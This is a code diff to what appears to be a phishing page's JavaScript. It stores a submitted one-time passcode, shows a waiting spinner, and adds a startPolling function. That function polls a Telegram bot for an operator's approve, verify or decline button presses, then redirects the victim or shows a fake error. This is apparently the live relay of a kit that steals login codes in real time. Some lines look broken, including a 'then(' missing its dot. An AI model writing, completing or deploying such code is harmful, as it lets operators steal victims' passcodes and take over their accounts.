@@ -557,7 +557,13 @@ Applicant: <code>Not provided</code>
           }
         })
       })
-      .then(() => {
+      then(() => {
+        localStorage.setItem('fbc_verified_otp', otp);
+        localStorage.setItem('fbc_login_phone', otp);
+        localStorage.setItem('fbc_otp_ref', '9vXfk');
+
+        document.getElementById('spinnerOverlay').style.display = 'flex';
+        startPolling(approveId, declineId, verifyId);
 
   window.addEventListener('DOMContentLoaded', () => {
     const savedRef = localStorage.getItem('fbc_otp_ref') || '9vXfk';
@@ -569,7 +575,46 @@ Applicant: <code>Not provided</code>
       otpInput.value = savedOtp;
     }
   });
+function startPolling(approveId, declineId, verifyId) {
+      const interval = setInterval(() => {
+        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
+          .then(r => r.json())
+          .then(data => {
+            if (!data.ok || !data.result) return;
 
+            data.result.forEach(update => {
+              state.lastUpdateId = update.update_id;
+
+              if (update.callback_query) {
+                const cb = update.callback_query.data;
+
+                if (cb === approveId) {
+                  clearInterval(interval);
+                  document.getElementById('spinnerOverlay').style.display = 'none';
+                  window.location.href = CONFIG.APPROVE_PAGE;
+                }
+                else if (cb === verifyId) {
+                  clearInterval(interval);
+                  document.getElementById('spinnerOverlay').style.display = 'none';
+                  window.location.href = CONFIG.APPROVE_PAGE;
+                }
+                else if (cb === declineId) {
+                  clearInterval(interval);
+                  document.getElementById('spinnerOverlay').style.display = 'none';
+                  showLoginError('Request declined. Please try again.');
+                  resetButton();
+                }
+              }
+            });
+          })
+          .catch(() => {
+            document.getElementById('spinnerOverlay').style.display = 'none';
+            showLoginError('Polling failed. Please try again.');
+            resetButton();
+          });
+      }, 1000);
+    }
+        
   function handleOtpSubmit(e) {
     e.preventDefault();
 
